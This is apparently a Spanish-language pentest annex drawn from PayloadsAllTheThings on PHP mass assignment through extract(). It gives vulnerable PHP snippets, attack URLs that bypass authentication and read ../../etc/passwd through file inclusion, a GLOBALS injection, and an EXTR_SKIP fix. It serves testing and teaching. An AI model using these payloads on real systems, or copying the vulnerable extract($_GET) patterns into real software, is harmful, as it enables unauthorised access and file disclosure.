# Mass assignment en APIs: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [External Variable Modification/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/External%20Variable%20Modification/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. External Variable Modification / Metodología

### Variantes presentes en tablas o texto del apartado

```text
extract()
EXTR_OVERWRITE
```

## 2. Metodología / Overwriting Critical Variables

```php
<?php
    $authenticated = false;
    extract($_GET);
    if ($authenticated) {
        echo "Access granted!";
    } else {
        echo "Access denied!";
    }
?>
```

```ps1
http://example.com/vuln.php?authenticated=true
http://example.com/vuln.php?authenticated=1
```

### Variantes presentes en tablas o texto del apartado

```text
extract()
extract($_GET)
$authenticated
true
```

## 3. Metodología / Envenenamiento Inclusión de archivos

```php
<?php
    $page = "config.php";
    extract($_GET);
    include "$page";
?>
```

```ps1
http://example.com/vuln.php?page=../../etc/passwd
```

### Variantes presentes en tablas o texto del apartado

```text
extract()
```

## 4. Metodología / Global Variable Inyección

```php
extract($_GET);
```

```ps1
http://example.com/vuln.php?GLOBALS[admin]=1
```

### Variantes presentes en tablas o texto del apartado

```text
$GLOBALS
extract
```

## 5. External Variable Modification / Remediations

```php
extract($_GET, EXTR_SKIP);
```

### Variantes presentes en tablas o texto del apartado

```text
EXTR_SKIP
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
